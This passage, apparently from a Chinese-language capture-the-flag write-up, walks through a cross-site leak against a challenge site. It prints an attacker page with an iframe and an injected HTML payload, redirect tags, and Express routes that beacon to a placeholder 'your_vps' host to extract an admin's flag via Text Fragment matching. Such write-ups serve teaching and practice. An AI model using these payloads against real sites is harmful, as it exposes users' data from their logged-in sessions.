port);</span><br></pre></td></tr></tbody></table></figure><p></p><p>index.html:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Psst! Get out of here...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> next = <span class="hljs-keyword">async</span> () =&gt; {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> res  = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/status&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span></span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;headers&quot;</span>: {</span></span><br><span class="line"><span class="hljs-actionscript">                            <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line">                        },</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                        &quot;body&quot;: `username=&quot;/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/injection&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/exfiltrated&quot;</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">&quot;lazy&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>&amp;password=1&amp;action=login`,</span></span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span></span><br><span class="line">                    });</span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/unlock&quot;</span>);</span></span><br><span class="line"><span class="hljs-actionscript">                } <span class="hljs-keyword">else</span> {</span></span><br><span class="line">                    next();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            next();</span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://catalog.pwni.ng/issue.php?id=issue_id_1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 400%; height: 500px; border: 0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;<code>your_vps</code>&#x5904;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684; vps &#x5730;&#x5740;&#xFF0C;issue_id_1 &#x66FF;&#x6362;&#x4E3A;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x5B57; id</p></li><li><p>&#x968F;&#x4FBF; report &#x4E00;&#x4E2A; issue &#x7ED9; admin &#x5E76;&#x6293;&#x5305;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#xFF0C;&#x628A; id &#x5B57;&#x6BB5;&#x6539;&#x6210; issue_id_2 &#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">id</span>=<span class="hljs-number">19902</span>&amp;token=<span class="hljs-number">03</span>AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PN<span class="hljs-literal">yeS</span>rcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g</span><br></pre></td></tr></tbody></table></figure><p></p><p>token &#x662F; Google &#x9A8C;&#x8BC1;&#x7801;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x7684; token &#xFF0C;&#x8FD9;&#x4E2A; token &#x4F60;&#x53EF;&#x4EE5;&#x53E6;&#x5F00;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF08;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5728;&#x9898;&#x76EE; main.js &#x62FF;&#x5230;&#xFF09;&#x5373;&#x53EF;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grecaptcha.ready(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> grecaptcha.execute(<span class="hljs-string">&quot;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span>, {</span><br><span class="line">        action: <span class="hljs-string">&quot;report&quot;</span></span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x5982;&#x679C; vps &#x6536;&#x5230;&#x4E86; match &#xFF0C;&#x5C31;&#x5728;&#x8BE5;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x91CD;&#x590D;1-4&#x6B65;&#x9AA4;&#x5373;&#x53EF;</p></li></ol><h3 id="Detailed-Attack-Chain"><a href="#Detailed-Attack-Chain" class="headerlink" title="Detailed Attack Chain"></a>Detailed Attack Chain</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C31;&#x6765;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5168;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x53CA;&#x8BF4;&#x4E00;&#x4E0B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF1A;</p><ol><li><p>&#x9996;&#x5148; admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A; issue &#xFF0C;&#x7136;&#x540E;&#x56E0;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A; issue_2 &#x5185;&#x5BB9;&#x5B58;&#x5728;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;</span>&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x6211;&#x4EEC; vps &#x4E3B;&#x9875;&#x9762;</p></li><li><p>&#x8FD9;&#x65F6; admin &#x4F1A;&#x52A0;&#x8F7D; index.html &#xFF0C;&#x6B64;&#x65F6; iframe &#x4F1A;&#x8BF7;&#x6C42;&#x7B2C;&#x4E00;&#x4E2A; issue_1 &#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4E14;&#x53D1;&#x9001;&#x8BF7;&#x6C42; <a href="http://your_vps/status" target="_blank" rel="noopener">http://your_vps/status</a> &#xFF0C;&#x6700;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x56E0;&#x4E3A;<code>let status = false;</code>&#xFF0C;&#x800C; js &#x8FD8;&#x6709;&#x4E00;&#x4E2A; status &#x7684;&#x5224;&#x65AD;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span><br><span class="line"><span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5; script &#x91CC;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x4F1A;&#x4E00;&#x76F4;&#x7B49;&#x5F85;<code>status</code>&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;&#x9501;&#x4E00;&#x6837;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x79F0;&#x4E3A; status &#x9501;&#xFF0C;&#x800C;&#x89E3;&#x9501;&#x8FD9;&#x4E2A;&#x9501;&#x7684;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x5F53; iframe &#x91CC;&#x9762;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x3002;</p><p>&#x5F53; iframe &#x4E2D;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#xFF0C;&#x6B64;&#x65F6; issue_1 &#x754C;&#x9762;&#x91CC;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x7528;&#x4E8E;&#x89E3;&#x9501; status &#x9501;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+<span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#...&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x8BF7;&#x6C42;&#x6211;&#x4EEC; <a href="http://your_vps/fragment" target="_blank" rel="noopener">http://your_vps/fragment</a> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x8DEF;&#x7531;&#x89E3;&#x9501;&#x4E86; status &#x9501;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x8BA1;&#x65F6;&#x5668;&#x7B49;&#x5F85; unlock &#x6765;&#x89E3;&#x9664;&#xFF0C;&#x6211;&#x4EEC;&#x79F0;&#x4E3A; fragment &#x9501;&#xFF0C;&#x8868;&#x793A; admin &#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x4E86; iframe &#x3002;</p></li><li><p>&#x8FD9;&#x662F;&#x56E0;&#x4E3A; fragment &#x9501;&#x7684;&#x539F;&#x56E0;&#xFF0C;iframe &#x5F53;&#x4E2D;&#x7684;&#x9875;&#x9762;&#x7B49;&#x5F85;&#x5728; issue_1 &#x754C;&#x9762;&#x7B49;&#x5F85; fragment &#x9501;&#x7684;&#x89E3;&#x9501;&#xFF0C;&#x800C;&#x5F53; status &#x9501;&#x89E3;&#x9501;&#xFF0C;&#x4F1A;&#x7ACB;&#x9A6C;&#x89E6;&#x53D1; index.html &#x5F53;&#x4E2D;&#x7684; fetch &#x8BF7;&#x6C42;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span><br><span class="line">  <span class="hljs-string">&quot;headers&quot;</span>: {</span><br><span class="line">  <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">`username=&quot;/&gt;&lt;img src=&quot;http://your_vps/injection&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;left&quot;&gt;&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span>,</span><br><span class="line">  <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x56E0;&#x4E3A;&#x8FD8;&#x662F; admin &#x7684; session &#xFF0C;&#x6240;&#x4EE5; admin session &#x5B58;&#x50A8;&#x7684; HTML &#x5143;&#x7D20;&#x4F1A;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;</p></li><li><p>&#x63A5;&#x7740; index.html &#x6267;&#x884C;<code>await fetch(&quot;/unlock&quot;);</code>&#xFF0C;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>unlock &#x8DEF;&#x7531;&#x5C06; unlock &#x7F6E;&#x4E3A; true&#xFF0C;&#x6E05;&#x9664;&#x4E86; fragment &#x8DEF;&#x7531;&#x5F53;&#x4E2D;&#x7684;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x89E3;&#x9501; fragment &#x9501;&#xFF0C;&#x6B64;&#x65F6; iframe &#x5F53;&#x4E2D;&#x7684; issue_1 &#x754C;&#x9762;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#xFF0C;&#x5E76;&#x56E0;&#x4E3A;<code>&lt;meta&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x8DF3;&#x8F6C;&#x5230;&#x4E86;&#x5305;&#x542B;&#x6709; FLAG &#x5E76;&#x4E14;&#x6709; Text Fragemnt &#x529F;&#x80FD;&#x7684;&#x9875;&#x9762;</p></li><li><p>&#x6B64;&#x65F6; FLAG &#x9875;&#x9762;&#x8FD8;&#x662F; admin session &#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E0A;&#x4E00;&#x8F6E;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;&#x4E5F;&#x5C31;&#x662F;&#x6CE8;&#x5165;&#x4E86;&#x5F88;&#x591A;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5C06; FLAG &#x6324;&#x51FA;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x754C;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x7531;&#x4E8E; uBlock &#x4F20;&#x9012;&#x4E86; User Activation &#x6FC0;&#x6D3B;&#x4E86; Text Fragment &#x529F;&#x80FD;&#xFF0C;&#x5C06;&#x4F1A;&#x5728;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x5339;&#x914D; FLAG &#x5B57;&#x7B26;</p></li><li><p>&#x4E00;&#x52A0;&#x8F7D;&#x5B8C;&#x754C;&#x9762;&#x9996;&#x5148;&#x4F1A;&#x56E0;&#x4E3A;<code>&lt;img src=&quot;http://your_vps/injection&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; injection &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span 